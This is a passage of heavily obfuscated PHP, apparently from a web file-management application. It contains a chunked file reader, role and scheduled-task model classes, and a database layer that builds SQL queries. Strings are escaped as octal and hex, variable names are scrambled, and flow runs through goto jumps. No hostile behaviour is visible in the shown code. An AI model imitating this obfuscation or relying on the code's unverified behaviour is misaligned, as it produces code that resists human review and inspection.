10) { throw new Exception("\151\x6f\x46\151\154\x65\122\x65\x61\x64\x20\x65\x72\162\157\x72\41\x20\163\164\x61\x72\164\75{$ĞœÄ¹¾}\73\154\x65\156\x67\164\150\75{$šû½ªñ}\73\40\x73\x69\x7a\145\x3d{$›ãåõô•}\73"); } $İÅœ©§¹ = 64 * 1024; $ëÃ‘°ì =& self::$_chunkBuffer[$this->path]; if (!$ëÃ‘°ì) { $ëÃ‘°ì = array(); } $–Òê°î” = 0; $Ô›ÂŸ = 0; $Ñ«Œ¦Ò = $ÉË¸Œ’Ì[12]; foreach ($ëÃ‘°ì as $–Òê°î” => $Ñ«Œ¦Ò) { $–Òê°î” = intval($–Òê°î”); $Ô›ÂŸ = $–Òê°î” + strlen($Ñ«Œ¦Ò); if ($ĞœÄ¹¾ >= $Ô›ÂŸ) { continue; } if ($ĞœÄ¹¾ >= $–Òê°î” && $ĞœÄ¹¾ + $šû½ªñ <= $Ô›ÂŸ) { return substr($Ñ«Œ¦Ò, $ĞœÄ¹¾ - $–Òê°î”, $šû½ªñ); } break; } if (count($ëÃ‘°ì) > 100 || timeFloat() - $this->timeStart > 2.0) { $this->log($ÉË¸Œ’Ì[1527], $ÉË¸Œ’Ì[1528] . count($ëÃ‘°ì) . "\73\163\x74\141\x72\164\75{$ĞœÄ¹¾}\54\154\145\156\x67\x74\x68\75{$šû½ªñ}\73\x70\157\163\145\72{$–Òê°î”}\x7e{$Ô›ÂŸ}"); throw new Exception($ÉË¸Œ’Ì[1529]); } $˜ì€ÙøÈ = intval($ĞœÄ¹¾ / $İÅœ©§¹) * $İÅœ©§¹; $Ôö‹ñŠæ = ceil(($ĞœÄ¹¾ + $šû½ªñ) / $İÅœ©§¹) * $İÅœ©§¹ - $˜ì€ÙøÈ; $««âĞü = IO::fileSubstr($this->path, $˜ì€ÙøÈ, $Ôö‹ñŠæ); $ëÃ‘°ì[$˜ì€ÙøÈ . $ÉË¸Œ’Ì[12]] = $««âĞü; ksort($ëÃ‘°ì); $Úœ¶ØÉ• = substr($««âĞü, $ĞœÄ¹¾ - $˜ì€ÙøÈ, $šû½ªñ); return $Úœ¶ØÉ•; } private function log($€Éóà¥, $ÂÎÛ–­) { $Âò•ßÇÊ =& $_SERVER[Îûáû“ş]; $¨¦»µşš = timeFloat() - $this->timeStart; write_log(sprintf($Âò•ßÇÊ[1530], $€Éóà¥, $this->info[$Âò•ßÇÊ[32]], $¨¦»µşš, $ÂÎÛ–­), $Âò•ßÇÊ[1184]); } } goto BÃ›š‰ÊİÍ; fÇ‰…ÉÍË™: class SystemRecordModel extends ModelBaseLight { } class SystemRoleModel extends ModelBaseLight { public $optionType = "\123\171\x73\164\x65\x6d\56\162\x6f\x6c\145\x4c\x69\163\164"; public $field = array("\156\141\x6d\145", "\141\165\x74\x68", "\154\x61\x62\x65\154", "\x64\151\163\160\x6c\141\171", "\x73\171\163\164\145\155", "\x64\x65\x73\143", "\151\147\156\x6f\x72\x65\105\x78\164", "\151\147\156\157\x72\x65\x46\151\154\x65\123\x69\172\x65", "\x61\x64\x6d\x69\156\151\x73\164\x72\141\x74\x6f\162", "\x73\157\x72\164"); public function listData($óÊø‹ê± = false, $íûÀŸ«Ò = "\x73\157\162\164", $ÇšÖŒ³¿ = false) { $Å¡“âáË =& $_SERVER[Îûáû“ş]; $¬ù¶Ë°â = parent::listData($óÊø‹ê±, $íûÀŸ«Ò, $ÇšÖŒ³¿); if (!$óÊø‹ê±) { foreach ($¬ù¶Ë°â as $˜Ş¶´Ú¶ => $ä³Ò‰ÁÌ) { if ($ä³Ò‰ÁÌ[$Å¡“âáË[2063]] == 1) { $¬ù¶Ë°â[$˜Ş¶´Ú¶][$Å¡“âáË[453]] = LNG($Å¡“âáË[2298]); } } } return $¬ù¶Ë°â; } public function update($ğİÑ ¡Ë, $ş¯±„İ—) { $î÷¤çëî =& $_SERVER[Îûáû“ş]; $ù„ë“”ı = parent::listData($ğİÑ ¡Ë); $óÑş¸›× = $this->findByName($ş¯±„İ—[$î÷¤çëî[32]]); if (!$ù„ë“”ı || $óÑş¸›× && $óÑş¸›×[$î÷¤çëî[399]] != $ù„ë“”ı[$î÷¤çëî[399]]) { return !1; } if ($óÑş¸›×[$î÷¤çëî[2063]] == 1) { $ş¯±„İ— = array($î÷¤çëî[32] => $ş¯±„İ—[$î÷¤çëî[32]], $î÷¤çëî[1884] => $ş¯±„İ—[$î÷¤çëî[1884]]); } $this->filterAuth($ş¯±„İ—[$î÷¤çëî[413]]); return parent::update($ğİÑ ¡Ë, $ş¯±„İ—); } public function remove($‚Ì±¸™ú) { $¾É²Úâí = parent::listData($‚Ì±¸™ú); if (!$¾É²Úâí || $¾É²Úâí[$_SERVER[Îûáû“ş][1286]]) { return !1; } return parent::remove($‚Ì±¸™ú); } public function add($ê†¬æô) { $÷±Øêı† =& $_SERVER[Îûáû“ş]; $ï¾©Ù†¥ = $ê†¬æô[$÷±Øêı†[32]]; if ($this->findByName($ï¾©Ù†¥)) { return !1; } $ñ©ûÀ¨À = array($÷±Øêı†[420] => $ï¾©Ù†¥, $÷±Øêı†[1867] => $÷±Øêı†[12], $÷±Øêı†[1863] => $÷±Øêı†[1871], $÷±Øêı†[2299] => 1, $÷±Øêı†[1866] => 0, $÷±Øêı†[2300] => 0, $÷±Øêı†[1865] => $this->getSort()); $ê†¬æô = array_merge($ñ©ûÀ¨À, $ê†¬æô); $this->filterAuth($ê†¬æô[$÷±Øêı†[413]]); return parent::insert($ê†¬æô); } private function getSort() { $ƒŒ™Ü—¯ =& $_SERVER[Îûáû“ş]; $ñµúØ² = parent::listData(); $´ñÍŠÊÉ = array_to_keyvalue($ñµúØ², $ƒŒ™Ü—¯[12], $ƒŒ™Ü—¯[1885]); return empty($´ñÍŠÊÉ) ? 0 : max($´ñÍŠÊÉ) + 1; } private function filterAuth(&$ò¸ëƒÃ) { $ˆí§Ää =& $_SERVER[Îûáû“ş]; $ä†«Ïˆ = array(); $ùÜ§ÉÏş = array_filter(explode($ˆí§Ää[50], $ò¸ëƒÃ)); foreach ($ùÜ§ÉÏş as $ò¸ëƒÃ) { $¿¡úÓßà = explode($ˆí§Ää[10], $ò¸ëƒÃ); if ($¿¡úÓßà[0] == $ˆí§Ää[2301] && $¿¡úÓßà[1] != $ˆí§Ää[1192]) { $äˆŠ°’î = $¿¡úÓßà[0] . $ˆí§Ää[10] . $¿¡úÓßà[1] . $ˆí§Ää[2302]; if (!in_array($äˆŠ°’î, $ùÜ§ÉÏş)) { $ä†«Ïˆ[] = $äˆŠ°’î; } } $ä†«Ïˆ[] = $ò¸ëƒÃ; } $ò¸ëƒÃ = implode($ˆí§Ää[50], $ä†«Ïˆ); } public function findRoleDefault() { $‰Ô©±Æî =& $_SERVER[Îûáû“ş]; $›úÀÚØü = parent::listData(); $ÙĞÑèš = !1; foreach ($›úÀÚØü as $úÖËğ¸Ë) { if (!$úÖËğ¸Ë || $úÖËğ¸Ë[$‰Ô©±Æî[1883]] == $‰Ô©±Æî[198] || $úÖËğ¸Ë[$‰Ô©±Æî[2063]] == 1) { continue; } if (strstr($úÖËğ¸Ë[$‰Ô©±Æî[413]], $‰Ô©±Æî[2303])) { continue; } if (!strstr($úÖËğ¸Ë[$‰Ô©±Æî[413]], $‰Ô©±Æî[2304])) { continue; } if (!$ÙĞÑèš) { $ÙĞÑèš = $úÖËğ¸Ë; continue; } $³ÛÂêâü = explode($‰Ô©±Æî[50], $ÙĞÑèš[$‰Ô©±Æî[413]]); $öï’œ”Ÿ = explode($‰Ô©±Æî[50], $úÖËğ¸Ë[$‰Ô©±Æî[413]]); if (count($³ÛÂêâü) > count($öï’œ”Ÿ)) { $ÙĞÑèš = $úÖËğ¸Ë; } } return $ÙĞÑèš ? $ÙĞÑèš[$‰Ô©±Æî[399]] : $‰Ô©±Æî[12]; } public function sort($ªİ¶ÀŞœ, $»´’é—ç) { return parent::update($ªİ¶ÀŞœ, $»´’é—ç); } } class SystemTaskModel extends ModelBaseLight { public $optionType = "\x53\171\x73\x74\145\155\x2e\x74\141\163\x6b\114\151\163\x74"; public $field = array("\x6e\x61\x6d\x65", "\164\x79\160\x65", "\145\166\145\156\164", "\164\151\155\145", "\144\x65\163\143", "\163\x79\163\164\x65\x6d", "\x65\156\x61\142\x6c\145", "\154\141\163\x74\122\x75\156", "\x73\157\x72\164"); public function listData($ÈÁÌÆë¯ = false, $ÍıâëÍ• = "\163\x6f\x72\164", $™²Äç˜ = false) { return parent::listData($ÈÁÌÆë¯, $ÍıâëÍ•, $™²Äç˜); } public function add($Õäï½Òƒ) { $ºµòÕéË =& $_SERVER[Îûáû“ş]; $á‰åùÇí = $this->findByName($Õäï½Òƒ[$ºµòÕéË[32]]); if ($á‰åùÇí) { return !1; } $Õäï½Òƒ[$ºµòÕéË[1630]] = 0; $Õäï½Òƒ[$ºµòÕéË[1885]] = $this->getSort(); return parent::insert($Õäï½Òƒ); } private function getSort() { $õ›µÁÌÂ =& $_SERVER[Îûáû“ş]; $î¯ßãé = parent::listData(); $“‚ï×æ² = array_to_keyvalue($î¯ßãé, $õ›µÁÌÂ[12], $õ›µÁÌÂ[1885]); return empty($“‚ï×æ²) ? 0 : max($“‚ï×æ²) + 1; } public function update($Üäöîµ€, $©ÅŞ™Î) { $âÔú¡üô =& $_SERVER[Îûáû“ş]; $êÔšğ› = $this->listData($Üäöîµ€); $øÍú½—À = $this->findByName($©ÅŞ™Î[$âÔú¡üô[32]]); if (!$êÔšğ› || $øÍú½—À && $øÍú½—À[$âÔú¡üô[399]] != $êÔšğ›[$âÔú¡üô[399]]) { return !1; } return parent::update($Üäöîµ€, $©ÅŞ™Î); } public function remove($à–±¤ÆË, $«ûÊ·ù¸ = false) { $è›µ©Äì =& $_SERVER[Îûáû“ş]; $Ëæ…Ñì = $this->listData($à–±¤ÆË); if (!$Ëæ…Ñì) { return; } if (!$«ûÊ·ù¸ && $Ëæ…Ñì[$è›µ©Äì[1286]] == $è›µ©Äì[88]) { return !1; } return parent::remove($à–±¤ÆË); } public function enable($Š°¼ãÕÃ, $šô®çí) { return $this->update($Š°¼ãÕÃ, array($_SERVER[Îûáû“ş][2293] => $šô®çí)); } public function run($şß¬ãúí) { return $this->update($şß¬ãúí, array($_SERVER[Îûáû“ş][2305] => time())); } } goto Eªãˆíö†¬; fÀ´Ç½‚ë: class Db { protected $dbType = null; protected $autoFree = false; protected $model = "\x5f\164\150\x69\x6e\x6b\x5f"; protected $pconnect = false; protected $queryStr = ''; protected $modelSql = array(); protected $lastInsID = null; protected $numRows = 0; protected $numCols = 0; protected $transTimes = 0; protected $error = ''; protected $linkID = array(); protected $_linkID = null; protected $queryID = null; protected $connected = false; protected $config = ''; protected $configLast = ''; protected $exp = array("\x65\x71" => "\75", "\x6e\x65\161" => "\74\76", "\147\x74" => "\x3e", "\145\x67\x74" => "\x3e\x3d", "\x6c\164" => "\74", "\x65\x6c\164" => "\74\75", "\x6e\157\164\154\151\x6b\x65" => "\116\x4f\124\x20\x4c\111\113\x45", "\154\x69\x6b\x65" => "\114\x49\113\x45", "\151\x6e" => "\111\116", "\x6e\157\x74\151\x6e" => "\x4e\117\124\40\111\116", "\x6e\157\164\x20\x69\156" => "\x4e\117\x54\x20\111\x4e", "\142\x65\164\167\x65\145\156" => "\102\105\x54\x57\x45\x45\x4e", "\x6e\x6f\164\142\x65\x74\x77\145\145\x6e" => "\116\117\x54\40\x42\x45\124\x57\x45\x45\116", "\156\157\x74\x20\142\145\164\167\145\x65\x6e" => "\116\x4f\124\40\102\105\124\x57\x45\x45\116"); protected $selectSql = "\x53\x45\114\105\x43\x54\x25\x44\111\123\124\x49\116\x43\x54\x25\x20\45\x46\x49\105\x4c\x44\x25\40\x46\x52\x4f\x4d\x20\x25\124\x41\102\114\x45\x25\45\x4a\x4f\111\116\x25\45\127\110\x45\122\x45\45\x25\x47\x52\117\x55\120\45\x25\x48\101\x56\x49\116\x47\45\x25\117\x52\104\x45\x52\x25\45\x4c\x49\115\x49\124\45\40\x25\x55\x4e\111\117\116\45\45\103\117\115\115\105\116\124\45"; protected $bind = array(); public static function getInstance() { $ßŒÍàæ = func_get_args(); return think_get_instance_of(__CLASS__, $_SERVER[Îûáû“ş][962], $ßŒÍàæ); } public function factory($ƒóØ“¯¤ = '') { $æ±Åş¤Ø =& $_SERVER[Îûáû“ş]; $ƒóØ“¯¤ = $this->parseConfig($ƒóØ“¯¤); if (empty($ƒóØ“¯¤[$æ±Åş¤Ø[963]])) { think_exception(think_lang($æ±Åş¤Ø[964])); } $this->dbType = ucwords(strtolower($ƒóØ“¯¤[$æ±Åş¤Ø[963]])); $”™Ê²½Æ = $æ±Åş¤Ø[965] . $this->dbType; if (class_exists($”™Ê²½Æ)) { $é†¾ş¬‚ = new $”™Ê²½Æ($ƒóØ“¯¤); if ($æ±Åş¤Ø[966] != strtolower($ƒóØ“¯¤[$æ±Åş¤Ø[963]])) { $é†¾ş¬‚->dbType = strtoupper($this->dbType); } else { $é†¾ş¬‚->dbType = $this->_getDsnType($ƒóØ“¯¤[$æ±Åş¤Ø[918]]); } } else { think_exception(think_lang($æ±Åş¤Ø[967]) . $æ±Åş¤Ø[968] . $”™Ê²½Æ); } return $é†¾ş¬‚; } public function __call($´ôß¡Ò¡, $Û«Áï¨) { if (method_exists($this, $´ôß¡Ò¡)) { return call_user_func_array(array($this, $´ôß¡Ò¡), $Û«Áï¨); } } protected function _getDsnType($ŸĞÎÇ») { $»Û§á³¶ = explode($_SERVER[Îûáû“ş][4], $ŸĞÎÇ»); $Œåáæú = strtoupper(trim($»Û§á³¶[0])); return $Œåáæú; } private function parseConfig($õ•€» = '') { $«í½§ˆâ =& $_SERVER[Îûáû“ş]; if (!empty($õ•€») && is_string($õ•€»)) { $õ•€» = $this->parseDSN($õ•€»); } elseif (is_array($õ•€»)) { $õ•€» = array_change_key_case($õ•€»); $õ•€» = array($«í½§ˆâ[963] => $õ•€»[$«í½§ˆâ[969]], $«í½§ˆâ[890] => $õ•€»[$«í½§ˆâ[970]], $«í½§ˆâ[891] => $õ•€»[$«í½§ˆâ[971]], $«í½§ˆâ[888] => $õ•€»[$«í½§ˆâ[972]], $«í½§ˆâ[889] => $õ•€»[$«í½§ˆâ[973]], $«í½§ˆâ[21] => $õ•€»[$«í½§ˆâ[974]], $«í½§ˆâ[918] => $õ•€»[$«í½§ˆâ[975]], $«í½§ˆâ[17] => isset($õ•€»[$«í½§ˆâ[976]]) ? $õ•€»[$«í½§ˆâ[976]] : array()); } elseif (empty($õ•€»)) { if (think_config($«í½§ˆâ[977]) && $«í½§ˆâ[966] != strtolower(think_config($«í½§ˆâ[978]))) { $õ•€» = $this->parseDSN(think_config($«í½§ˆâ[977])); } else { $õ•€» = array($«í½§ˆâ[963] => think_config($«í½§ˆâ[978]), $«í½§ˆâ[890] => think_config($«í½§ˆâ[979]), $«í½§ˆâ[891] => think_config($«í½§ˆâ[980]), $«í½§ˆâ[888] => think_config($«í½§ˆâ[981]), $«í½§ˆâ[889] => think_config($«í½§ˆâ[982]), $«í½§ˆâ[21] => think_config($«í½§ˆâ[246]), $«í½§ˆâ[918] => think_config($«í½§ˆâ[977]), $«í½§ˆâ[17] => think_config($«í½§ˆâ[983])); } } return $õ•€»; } protected function initConnect($ò÷ñ·ã¤ = true) { if (1 == think_config($_SERVER[Îûáû“ş][22])) { $this->_linkID = $this->multiConnect($ò÷ñ·ã¤); } else { if ($this->config) { $this->configLast = $this->config; } } if (!$this->connected) { $this->_linkID = $this->connect(); } } protected function closeConnect() { if (!$this->connected) { return; } foreach ($this->linkID as $¨÷¸÷Ñê => $ÈˆöòÁ) { $this->_linkID = $ÈˆöòÁ; $this->close(); } $this->linkID = array(); $this->_linkID = null; $this->connected = !1; if (!$this->config && $this->configLast) { $this->config = $this->configLast; } } protected function multiConnect($¿îÃ¾½ü = false) { $Ş‰ğ™ì =& $_SERVER[Îûáû“ş]; static $‘Çã‡†æ = array(); static $´ÀÇ¬³ò = -1; if (empty($‘Çã‡†æ)) { foreach ($this->config as $²É„•Éƒ => $ÙàŞ´€ì) { $‘Çã‡†æ[$²É„•Éƒ] = explode($Ş‰ğ™ì[50], $ÙàŞ´€ì); } } if (think_config($Ş‰ğ™ì[984])) { if ($¿îÃ¾½ü || think_config($Ş‰ğ™ì[395]) === !0) { $“¦Ò—Èó = floor(mt_rand(0, think_config($Ş‰ğ™ì[985]) - 1)); $´ÀÇ¬³ò = $“¦Ò—Èó; } else { if (is_numeric(think_config($Ş‰ğ™ì[986]))) { $“¦Ò—Èó = think_config($Ş‰ğ™ì[986]); } else { $“¦Ò—Èó = floor(mt_rand(think_config($Ş‰ğ™ì[985]), count($‘Çã‡†æ[$Ş‰ğ™ì[888]]) - 1)); } } } else { $“¦Ò—Èó = floor(mt_rand(0, count($‘Çã‡†æ[$Ş‰ğ™ì[888]]) - 1)); $´ÀÇ¬³ò = $“¦Ò—Èó; } $“¦Ò—Èó = $´ÀÇ¬³ò !== -1 ? $´ÀÇ¬³ò : $“¦Ò—Èó; $Òİöş¥‡ = array($Ş‰ğ™ì[890] => isset($‘Çã‡†æ[$Ş‰ğ™ì[890]][$“¦Ò—Èó]) ? $‘Çã‡†æ[$Ş‰ğ™ì[890]][$“¦Ò—Èó] : $‘Çã‡†æ[$Ş‰ğ™ì[890]][0], $Ş‰ğ™ì[891] => isset($‘Çã‡†æ[$Ş‰ğ™ì[891]][$“¦Ò—Èó]) ? $‘Çã‡†æ[$Ş‰ğ™ì[891]][$“¦Ò—Èó] : $‘Çã‡†æ[$Ş‰ğ™ì[891]][0], $Ş‰ğ™ì[888] => isset($‘Çã‡†æ[$Ş‰ğ™ì[888]][$“¦Ò—Èó]) ? $‘Çã‡†æ[$Ş‰ğ™ì[888]][$“¦Ò—Èó] : $‘Çã‡†æ[$Ş‰ğ™ì[888]][0], $Ş‰ğ™ì[889] => isset($‘Çã‡†æ[$Ş‰ğ™ì[889]][$“¦Ò—Èó]) ? $‘Çã‡†æ[$Ş‰ğ™ì[889]][$“¦Ò—Èó] : $‘Çã‡†æ[$Ş‰ğ™ì[889]][0], $Ş‰ğ™ì[21] => isset($‘Çã‡†æ[$Ş‰ğ™ì[21]][$“¦Ò—Èó]) ? $‘Çã‡†æ[$Ş‰ğ™ì[21]][$“¦Ò—Èó] : $‘Çã‡†æ[$Ş‰ğ™ì[21]][0], $Ş‰ğ™ì[918] => isset($‘Çã‡†æ[$Ş‰ğ™ì[918]][$“¦Ò—Èó]) ? $‘Çã‡†æ[$Ş‰ğ™ì[918]][$“¦Ò—Èó] : $‘Çã‡†æ[$Ş‰ğ™ì[918]][0], $Ş‰ğ™ì[17] => isset($‘Çã‡†æ[$Ş‰ğ™ì[17]][$“¦Ò—Èó]) ? $‘Çã‡†æ[$Ş‰ğ™ì[17]][$“¦Ò—Èó] : $‘Çã‡†æ[$Ş‰ğ™ì[17]][0]); return $this->connect($Òİöş¥‡, $“¦Ò—Èó); } public function parseDSN($ÅÏï…) { $ËæÄ‚à =& $_SERVER[Îûáû“ş]; if (empty($ÅÏï…)) { return !1; } $®”Çœ = parse_url($ÅÏï…); if ($®”Çœ[$ËæÄ‚à[181]]) { $Éºˆ×İË = array($ËæÄ‚à[963] => $®”Çœ[$ËæÄ‚à[181]], $ËæÄ‚à[890] => isset($®”Çœ[$ËæÄ‚à[590]]) ? $®”Çœ[$ËæÄ‚à[590]] : $ËæÄ‚à[12], $ËæÄ‚à[891] => isset($®”Çœ[$ËæÄ‚à[987]]) ? $®”Çœ[$ËæÄ‚à[987]] : $ËæÄ‚à[12], $ËæÄ‚à[888] => isset($®”Çœ[$ËæÄ‚à[182]]) ? $®”Çœ[$ËæÄ‚à[182]] : $ËæÄ‚à[12], $ËæÄ‚à[889] => isset($®”Çœ[$ËæÄ‚à[183]]) ? $®”Çœ[$ËæÄ‚à[183]] : $ËæÄ‚à[12], $ËæÄ‚à[21] => isset($®”Çœ[$ËæÄ‚à[84]]) ? substr($®”Çœ[$ËæÄ‚à[84]], 1) : $ËæÄ‚à[12]); } else { preg_match($ËæÄ‚à[988], trim($ÅÏï…), $ò¢ºá»Í); $Éºˆ×İË = array($ËæÄ‚à[963] => $ò¢ºá»Í[1], $ËæÄ‚à[890] => $ò¢ºá»Í[2], $ËæÄ‚à[891] => $ò¢ºá»Í[3], $ËæÄ‚à[888] => $ò¢ºá»Í[4], $ËæÄ‚à[889] => $ò¢ºá»Í[5], $ËæÄ‚à[21] => $ò¢ºá»Í[6]); } $Éºˆ×İË[$ËæÄ‚à[918]] = $ËæÄ‚à[12]; return $Éºˆ×İË; } protected function debug() { $Ë•‡ÂÊÈ =& $_SERVER[Îûáû“ş]; $this->modelSql[$this->model] = $this->queryStr; $this->model = $Ë•‡ÂÊÈ[989]; if (think_config($Ë•‡ÂÊÈ[990])) { think_status($Ë•‡ÂÊÈ[991]); think_trace($this->queryStr . $Ë•‡ÂÊÈ[992] . think_status($Ë•‡ÂÊÈ[24], $Ë•‡ÂÊÈ[991], 6) . $Ë•‡ÂÊÈ[993], $Ë•‡ÂÊÈ[12], $Ë•‡ÂÊÈ[994]); } } protected function parseLock($æØç¥â¾ = false) { $ª›œñ©Ê =& $_SERVER[Îûáû“ş]; if (!$æØç¥â¾) { return $ª›œñ©Ê[12]; } if ($ª›œñ©Ê[920] == $this->dbType) { return $ª›œñ©Ê[995]; } return $ª›œñ©Ê[996]; } protected function parseSet($Ìë¤û’) { $Üìí²î‘ =& $_SERVER[Îûáû“ş]; foreach ($Ìë¤û’ as $ó®öÃ¸š => $ªÑßö†¶) { if (is_array($ªÑßö†¶) && $Üìí²î‘[297] == $ªÑßö†¶[0]) { $›‚è¡ô[] = $this->parseKey($ó®öÃ¸š) . $Üìí²î‘[886] . $ªÑßö†¶[1]; } elseif (is_scalar($ªÑßö†¶) || is_null($ªÑßö†¶)) { $›‚è¡ô[] = $this->parseKey($ó®öÃ¸š) . $Üìí²î‘[886] . $this->parseValue($ªÑßö†¶); } } return $Üìí²î‘[997] . implode($Üìí²î‘[50], $›‚è¡ô); } protected function bindParam($µÜ¯Ñ²¸, $Ûí—Œì¿) { $this->bind[$_SERVER[Îûáû“ş][4] . $µÜ¯Ñ²¸] = $Ûí—Œì¿; } protected function parseBind($´Öáˆˆ) { $´Öáˆˆ = array_merge($this->bind, $´Öáˆˆ); $this->bind = array(); return $´Öáˆˆ; } function parseKey(&$­ÜÈ˜âÎ, $õ”ŸÄ¥¬ = true) { if ($õ”ŸÄ¥¬) { $­ÜÈ˜âÎ = $this->parseKeyCheck($­ÜÈ˜âÎ); } return $­ÜÈ˜âÎ; } function parseKeyCheck($Ô¨œÚ©â) { $ÒÓÉÔ£ê =& $_SERVER[Îûáû“ş]; $Ô¨œÚ©â = trim($Ô¨œÚ©â); if (!preg_match($ÒÓÉÔ£ê[998], $Ô¨œÚ©â)) { think_exception($ÒÓÉÔ£ê[999] . $Ô¨œÚ©â); } return $Ô¨œÚ©â; } protected function parseValue($ªÖ€Ä«„) { $º£Óºûİ =& $_SERVER[Îûáû“ş]; if (is_string($ªÖ€Ä«„)) { $ªÖ€Ä«„ = $º£Óºûİ[959] . $this->escapeString($ªÖ€Ä«„) . $º£Óºûİ[959]; } elseif (isset($ªÖ€Ä«„[0]) && is_string($ªÖ€Ä«„[0]) && strtolower($ªÖ€Ä«„[0]) == $º£Óºûİ[297]) { $ªÖ€Ä«„ = $this->escapeString($ªÖ€Ä«„[1]); } elseif (is_array($ªÖ€Ä«„)) { $ªÖ€Ä«„ = array_map(array($this, $º£Óºûİ[960]), $ªÖ€Ä«„); } elseif (is_bool($ªÖ€Ä«„)) { $ªÖ€Ä«„ = $ªÖ€Ä«„ ? $º£Óºûİ[88] : $º£Óºûİ[198]; } elseif (is_null($ªÖ€Ä«„)) { $ªÖ€Ä«„ = $º£Óºûİ[103]; } return $ªÖ€Ä«„; } protected function parseField($õ¸î¦Ì‹) { $‘ŞÛÙï =& $_SERVER[Îûáû“ş]; if (is_string($õ¸î¦Ì‹) && strpos($õ¸î¦Ì‹, $‘ŞÛÙï[50])) { $õ¸î¦Ì‹ = explode($‘ŞÛÙï[50], $õ¸î¦Ì‹); } if (is_array($õ¸î¦Ì‹)) { $ÍËï´§ = array(); foreach ($õ¸î¦Ì‹ as $ÕÖ‘ñß => $ôÄÓÅˆ) { if (!is_numeric($ÕÖ‘ñß)) { $ÍËï´§[] = $this->parseKey($ÕÖ‘ñß, !1) . $‘ŞÛÙï[1000] . $this->parseKey($ôÄÓÅˆ); } else { $ÍËï´§[] = $this->parseKey($ôÄÓÅˆ); } } $€¨ÔÌŒª = implode($‘ŞÛÙï[50], $ÍËï´§); } elseif (is_string($õ¸î¦Ì‹) && !empty($õ¸î¦Ì‹)) { $€¨ÔÌŒª = $õ¸î¦Ì‹; } else { $€¨ÔÌŒª = $‘ŞÛÙï[189]; } return $€¨ÔÌŒª; } protected function parseTable($üÌßÄÎ–) { $Ôõİ¼Ÿ˜ =& $_SERVER[Îûáû“ş]; if (is_array($üÌßÄÎ–)) { $©¶à“È´ = array(); foreach ($üÌßÄÎ– as $Òí¥æê­ => $ıéÉùÛĞ) { if (!is_numeric($Òí¥æê­)) { $©¶à“È´[] = $this->parseKey($Òí¥æê­) . $Ôõİ¼Ÿ˜[53] . $this->parseKey($ıéÉùÛĞ); } else { $©¶à“È´[] = $this->parseKey($Òí¥æê­); } } $üÌßÄÎ– = $©¶à“È´; } elseif (is_string($üÌßÄÎ–)) { if (strstr($üÌßÄÎ–, $Ôõİ¼Ÿ˜[53])) { return $üÌßÄÎ–; } $üÌßÄÎ– = explode($Ôõİ¼Ÿ˜[50], $üÌßÄÎ–); array_walk($üÌßÄÎ–, array($this, $Ôõİ¼Ÿ˜[908])); } return $Ôõİ¼Ÿ˜[902] . trim(implode($Ôõİ¼Ÿ˜[1001], $üÌßÄÎ–), $Ôõİ¼Ÿ˜[385]) . $Ôõİ¼Ÿ˜[902]; } protected function parseWhere($µÛñÓà) { $ÀìÄæ» =& $_SERVER[Îûáû“ş]; $›ıÁ¦Ê¨ = $ÀìÄæ»[12]; if (is_string($µÛñÓà)) { $›ıÁ¦Ê¨ = $µÛñÓà; } else { $§ÌÎ®µÍ = isset($µÛñÓà[$ÀìÄæ»[1002]]) ? strtoupper($µÛñÓà[$ÀìÄæ»[1002]]) : $ÀìÄæ»[12]; if (in_array($§ÌÎ®µÍ, array($ÀìÄæ»[1003], $ÀìÄæ»[1004], $ÀìÄæ»[1005]))) { $§ÌÎ®µÍ = $ÀìÄæ»[53] . $§ÌÎ®µÍ . $ÀìÄæ»[53]; unset($µÛñÓà[$ÀìÄæ»[1002]]); } else { $§ÌÎ®µÍ = $ÀìÄæ»[1006]; } foreach ($µÛñÓà as $ä•û»Êı => $”Ä˜²ÉÅ) { $›ıÁ¦Ê¨ .= $ÀìÄæ»[277]; if (is_numeric($ä•û»Êı)) { $ä•û»Êı = $ÀìÄæ»[1007]; } if (0 === strpos($ä•û»Êı, $ÀìÄæ»[11])) { $›ıÁ¦Ê¨ .= $this->parseThinkWhere($ä•û»Êı, $”Ä˜²ÉÅ); } else { if (!preg_match($ÀìÄæ»[1008], trim($ä•û»Êı))) { think_exception(think_lang($ÀìÄæ»[1009]) . $ÀìÄæ»[4] . $ä•û»Êı); } $®¾Ï®ËÇ = is_array($”Ä˜²ÉÅ) && isset($”Ä˜²ÉÅ[$ÀìÄæ»[1010]]); $ä•û»Êı = trim($ä•û»Êı); if (strpos($ä•û»Êı, $ÀìÄæ»[283])) { $íİ†£òÎ = explode($ÀìÄæ»[283], $ä•û»Êı); $Á”ğşı… = array(); foreach ($íİ†£òÎ as $ıÛÄœÑ => $”îÍ¯¾à) { $Šáî«è = $®¾Ï®ËÇ ? $”Ä˜²ÉÅ[$ıÛÄœÑ] : $”Ä˜²ÉÅ; $Á”ğşı…[] = $ÀìÄæ»[260] . $this->parseWhereItem($this->parseKey($”îÍ¯¾à), $Šáî«è) . $ÀìÄæ»[907]; } $›ıÁ¦Ê¨ .= implode($ÀìÄæ»[1011], $Á”ğşı…); } elseif (strpos($ä•û»Êı, $ÀìÄæ»[284])) { $íİ†£òÎ = explode($ÀìÄæ»[284], $ä•û»Êı); $Á”ğşı… = array(); foreach ($íİ†£òÎ as $ıÛÄœÑ => $”îÍ¯¾à) { $Šáî«è = $®¾Ï®ËÇ ? $”Ä˜²ÉÅ[$ıÛÄœÑ] : $”Ä˜²ÉÅ; $Á”ğşı…[] = $ÀìÄæ»[260] . $this->parseWhereItem($this->parseKey($”îÍ¯¾à), $Šáî«è) . $ÀìÄæ»[907]; } $›ıÁ¦Ê¨ .= implode($ÀìÄæ»[1006], $Á”ğşı…); } else { $›ıÁ¦Ê¨ .= $this->parseWhereItem($this->parseKey($ä•û»Êı), $”Ä˜²ÉÅ); } } $›ıÁ¦Ê¨ .= $ÀìÄæ»[278] . $§ÌÎ®µÍ; } $›ıÁ¦Ê¨ = substr($›ıÁ¦Ê¨, 0, -strlen($§ÌÎ®µÍ)); } return empty($›ıÁ¦Ê¨) ? $ÀìÄæ»[12] : $ÀìÄæ»[1012] . $›ıÁ¦Ê¨; } protected function parseWhereItem($ĞóİÉ¿’, $’‘è¡ı÷) { $¿ÚÔúö =& $_SERVER[Îûáû“ş]; $ÊÌò®ĞÎ = $¿ÚÔúö[12]; if (is_array($’‘è¡ı÷)) { if (is_string($’‘è¡ı÷[0])) { $ ¼÷‘Öƒ = strtolower($’‘è¡ı÷[0]); if (in_array($’‘è¡ı÷[0], array($¿ÚÔúö[886], $¿ÚÔúö[1013], $¿ÚÔúö[1014], $¿ÚÔúö[1015], $¿ÚÔúö[1016], $¿ÚÔúö[1017]))) { 